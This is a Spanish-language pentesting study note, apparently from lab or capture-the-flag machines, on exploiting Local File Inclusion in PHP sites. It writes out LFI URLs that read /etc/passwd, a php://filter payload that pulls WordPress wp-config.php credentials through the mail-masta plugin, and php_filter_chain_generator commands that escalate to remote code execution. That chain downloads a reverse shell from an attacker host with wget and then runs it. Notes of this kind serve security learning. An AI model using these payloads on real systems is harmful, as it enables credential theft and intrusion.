Esta vulnerabilidad consiste en poder acceder a archivos internos de la máquina, donde funciona principalmente con webs hechas en php. Por ejemplo, si estamos ante una web o un CMS vulnerable como en el siguiente caso, podemos ver que si vemos un exploit de esta vulnerabilidad nos explican como acceder a los archivos internos de la máquina:
![[pasted image 0 3.png]]
Vamos a examinar este exploit, donde vemos que se aprovecha de una vulnerabilidad de local file inclusion, lo que significa que podemos acceder a archivos locales de la máquina:
![[pasted image 0 4.png]]
Vamos a copiar y pegar esa línea y probemos cómo funciona, y si lo pegamos en el navegador accedemos al archivo que queramos, que en mi caso lo modifiqué y puse para ver el fichero etc/passwd:
![[pasted image 0 5.png]]
Pero lo interesante es acceder con el mismo comando del exploit, donde veremos que tenemos acceso a unas credenciales, donde presionamos CONTROL+U y veremos la información estructurada:
![[pasted image 0 6.png]]
Ahora con estas credenciales podremos iniciar sesión en muchos sitios.
## ADQUIRIR WP-CONFIG.PHP DE WOPRDPRESS
Si encontramos un LFI dentro de un wordpress, podemos obtener el fichero de configuración donde se almacenan las credenciales llamado wp-config.php; y para ello tenemos que usar un wrapper (explotando el plugin que corresponda):
```bash
http://10.10.6.206/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```
![[Pasted image 20230826170029.png]]
## EJECUCIÓN REMOTA DE COMANDOS CON LFI
También podemos lograr ejecución remota de comandos si hemos conseguido explotar un LFI y veamos que la web acepte wrappers, por ejemplo dentro de la máquina [[MAQUINA CHAIN]]

------------------------------

Y por aquí podemos explotar un LFI de una forma muy básica:
```
http://utils.chaincorp.nyx/include.php?in=../../../../../../etc/passwd
```
![[Pasted image 20231120194330.png]]
No obstante, podemos intentar leer el fichero include.php, que lo vemos dentro de la url pero en un principio no podemos leerlo, por lo que podemos usar un wrapper, que podemos extraerlo de este repositorio de github:
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#local-file-inclusion
```
![[Pasted image 20231120194607.png]]
Lo aplicamos y nos devuelve el contenido de este archivo codificado en base64:
```
http://utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php
```
![[Pasted image 20231120194706.png]]
Y vemos que efectivamente podemos bypassear el lfi y leer el contenido de cualquier fichero:
![[Pasted image 20231120194752.png]]
Existe una tool llamada php_filet_chain_generator que nos permite ejecutar un comando a partir de un LFI conocido, la cual podemos encontrarla en el siguiente repositorio de github:
```
https://github.com/synacktiv/php_filter_chain_generator
```
Y aquí tenemos sus instrucciones de uso:
![[Pasted image 20231120195055.png]]
Lo ejecutamos pero en la parte del php le metemos un comando, por ejemplo el comando ls -l:
```bash
python3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
```
![[Pasted image 20231120195245.png]]
Pegamos todo esto a partir del php?in= y vemos que se ejecuta el comando:
![[Pasted image 20231120195326.png]]
En este punto lo que haremos será compartir la reverse shell dentro de un index.html desde python, y dentro del payload tenemos que usar wget primero para descargarlo:
![[Pasted image 20231129132004.png]]
```bash
python3 php_filter_chain_generator.py --chain "<?php system('wget 192.168.0.24'); ?>"
```
![[Pasted image 20231129132036.png]]
Y si lanzamos un ls, ahora el archivo está dentro de la máquina, por lo que ejecutamos el siguiente otro payload para ejecutar dicho archivo:
![[Pasted image 20231129132131.png]]
Por tanto ahora ya podemos ejecutar este archivo y obtener la reverse shell:
```bash
python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.3'); ?>"
```
![[Pasted image 20231129132243.png]]
![[Pasted image 20231129132323.png]]
Y habremos recibido la conexión:
![[Pasted image 20231129132337.png]]
